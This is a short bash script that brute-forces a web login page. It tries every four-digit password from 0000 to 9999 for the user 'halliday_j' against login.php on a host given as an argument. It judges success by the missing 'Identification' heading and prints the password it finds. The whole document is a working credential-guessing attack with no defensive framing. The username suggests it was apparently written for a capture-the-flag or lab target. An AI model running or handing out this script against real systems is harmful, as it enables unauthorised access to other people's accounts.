#!/bin/bash

for i in $(seq -w 0000 9999)
do
    sa=$(curl -s --data "login=halliday_j&password=$i" http://$1/login.php | grep "<h1>Identification</h1>" | wc -c)
   if [ "$sa" -eq 0 ]
   then
       echo "FOUND PASSWORD: $i"
       break
   else
	echo "$i - Failed"
   fi
done
